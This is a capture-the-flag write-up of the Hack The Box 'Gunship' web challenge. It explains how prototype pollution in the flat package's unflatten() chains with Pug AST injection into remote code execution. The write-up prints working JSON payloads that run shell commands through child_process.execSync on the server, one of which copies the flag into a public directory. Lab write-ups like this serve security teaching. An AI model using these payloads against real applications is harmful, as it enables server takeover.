<h1 style="color:blue;">Gunship challenge</h1>

Platform: Hack The Box

Author: 0xL0m4

Category: Web (Very Easy)

<img width="1581" height="177" alt="image" src="https://github.com/user-attachments/assets/d24e6375-8245-4a9b-8039-f6ebd1d38ef1" />


## Challenge Description:
A city of lights, with retrofuturistic 80s peoples, and coffee, and drinks from another world... all the wooing in the world to make you feel more lonely... this ride ends here, with a tribute page of the British synthwave band called Gunship.


## Tools Used

  - Burp Suite
  - Curl
  - Vs code


## Steps:

### 1. Download the source code and open the website

After downloading and reviewing the source code, I started analyzing the application structure.

During the source code review, I noticed an route:

/api/submit


This endpoint uses the unflatten method from the flat package:


### 2. Identifying the vulnerability

Checking the package.json file, we find the installed version of the flat package:

```
"flat": "5.0.0"
```

This version is vulnerable to Prototype Pollution CVE-2020-36632
The vulnerable function is unflatten()

The issue occurs because user-controlled input can modify the JavaScript prototype chain through the \_\_proto__ property.


### 3. From Prototype Pollution to RCE
While reviewing the application, I noticed that it uses the Pug template engine.

Prototype Pollution can be chained with Pug to achieve AST Injection.

The idea is to inject a malicious block object into Object.prototype:

Object.prototype.block = {
    type: 'Text',
    line: 'command injection'
};

When Pug compiles the template, it processes this polluted object as part of its AST, resulting in arbitrary JavaScript execution.

### 4. Exploiting the vulnerability
First, we send a payload to test command execution:
```
{
    "artist.name": "Haigh",
    "__proto__": {
        "block": {
            "type": "Text",
            "line": "process.mainModule.require('child_process').execSync('ls')"
        }
    }
}
```

The application processes the polluted object and executes the command on the server.

After confirming RCE, we modify the payload to copy the flag into the static directory:
```
{
    "artist.name": "Haigh",
    "__proto__": {
        "block": {
            "type": "Text",
            "line": "process.mainModule.require('child_process').execSync('cp /app/flag* /app/static/flag')"
        }
    }
}
```

### 5. Getting the flag

Now, the flag is copied into a publicly accessible location.

Let's request /static/flag

The flag is successfully retrieved.

Voilaaa!

The flag was successfully retrieved.

#

[The challenge link](https://app.hackthebox.com/challenges/Gunship?tab=play_challenge)

See you in the next writeup!
 
سبحانك اللهم وبحمدك، أشهد أن لا إله إلا أنت، أستغفرك وأتوب إليك.

